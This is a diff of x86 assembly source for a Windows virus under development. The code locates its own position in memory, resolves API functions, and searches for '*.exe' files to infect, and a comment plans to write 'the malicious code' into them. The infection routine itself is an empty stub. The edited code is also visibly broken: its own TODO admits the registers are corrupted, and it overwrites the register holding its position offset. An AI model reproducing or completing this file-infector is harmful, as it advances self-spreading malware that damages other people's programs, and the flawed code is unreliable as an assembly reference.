@@ -27,10 +27,6 @@ option casemap :none
 .data
 ; No data here please, put it at the end of the .code section
 
-   ; I can read... but it's temporary
-   win32_find_data                     WIN32_FIND_DATAA <?>
-   FileHandleFind                      dd ?
-
 .code
 
 start:
@@ -91,32 +87,44 @@ deltaoffset:
     ; sinon, writefile le code malveillant
 
 find_first:
+
     ; find first .exe file - filter: *.exe. exit_fail if none is found
     mov     eax, ebp ; EBP -> real address of delta offset
     add     eax, offset FindFirstFile_b
     sub     eax, offset deltaoffset
+
     ; call ent_get_function_addr with "FindFirstFile"
     push    eax
     push    edi ; PE header
     push    esi ; DOS header
     call    ent_get_function_addr
-    ; push args && call the function: arg1 WIN32_FIND_DATA, arg2 filter '*.exe'
-    mov     ecx, ebp
-    add     ecx, offset win32_find_data
-    sub     ecx, offset deltaoffset
-    mov     ebx, ebp
-    add     ebx, offset filter
-    sub     ebx, offset deltaoffset
+
+    push    ebp
+    mov     ebp, esp
+    sub     esp, 320
+    mov     find_data [ebp - 320], offset win32_find_data
+    push    find_data [ebp - 320]
+
+    ; push args && call the function: arg2 WIN32_FIND_DATA, arg1 filter '*.exe'
+    lea     ecx, [ebp - 320]
+    lea     ebx, [filter]
     push    ecx
     push    ebx
     call    eax
+
     ; If it hasn't found any file, jumps to exit_fail
     cmp     eax, -1
     jz      exit_fail
+
     ; Else save the Handle in FileHandleFind
-    mov     FileHandleFind, eax
-    ; call infect_file to try and infect it
-    call infect_file
+    mov     ebx, offset FileHandleFind
+    sub     ebx, offset deltaoffset
+    mov     ebx, eax
+
+    ; TODO: successfully gets first .exe, but the registers are messed up :x
+
+infect_file:
+    ; nada
 
     call    exit_success
 
@@ -412,11 +420,6 @@ strcmp_done:
     pop     ebp
     ret     8
 
-infect_file:
-    ; nada
-    invoke  StdOut, offset win32_find_data.cFileName
-    ret     0
-
 exit_success:
     ; WIN
     mov     eax,042h
@@ -429,27 +432,27 @@ exit_fail:
 
 ; All the virus data: use delta offset
 virus_data:
-;   filetime struct
-;       dwLowDateTime     DWORD     ?
-;       dwHighDateTime    DWORD     ?
-;   filetime ends
+   filetime struct
+       dwLowDateTime     DWORD     ?
+       dwHighDateTime    DWORD     ?
+   filetime ends
 
-;   find_data struct
-;       dwFileAttributes       DWORD ?
-;       ftCreationTime         filetime <?>
-;       ftLastAccessTime       filetime <?>
-;       ftLastWriteTime        filetime <?>
-;       nFileSizeHigh          DWORD ?
-;       nFileSizeLow           DWORD ?
-;       dwReserved0            DWORD ?
-;       dwReserved1            DWORD ?
-;       cFileName              BYTE 260 dup (?)
-;       cAlternateFileName     BYTE 14  dup (?)
-;   find_data ends
+   find_data struct
+       dwFileAttributes       DWORD ?
+       ftCreationTime         filetime <?>
+       ftLastAccessTime       filetime <?>
+       ftLastWriteTime        filetime <?>
+       nFileSizeHigh          DWORD ?
+       nFileSizeLow           DWORD ?
+       dwReserved0            DWORD ?
+       dwReserved1            DWORD ?
+       cFileName              BYTE 260 dup (?)
+       cAlternateFileName     BYTE 14  dup (?)
+   find_data ends
 
-   ;win32_find_data                     find_data <?>
-   ;win32_find_data                     WIN32_FIND_DATAA <?>
-   ;FileHandleFind                      dd ?
+   win32_find_data find_data <?>
+   ;win32_find_data WIN32_FIND_DATAA <?>
+   FileHandleFind  dd ?
    filter          db "*.exe",0
 
     ;WndTextOut1 db  "Address: 0x"
